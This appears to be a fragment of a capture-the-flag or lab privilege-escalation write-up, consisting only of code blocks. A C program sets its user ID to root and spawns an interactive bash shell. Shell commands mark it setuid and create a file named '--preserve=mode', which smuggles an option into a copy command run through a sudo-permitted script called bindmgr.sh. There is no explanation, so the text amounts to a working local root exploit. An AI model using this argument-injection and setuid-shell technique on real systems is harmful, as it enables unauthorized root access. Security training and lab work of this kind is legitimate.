```C
int main(){
	setuid(0); 
	system("/bin/bash -i"); 
}
```

```bash
chmod +x getpwn
chmod u+s getpwn
touch -- --preserve=mode
```

```bash
sudo /usr/local/bin/bindmgr.sh
``` 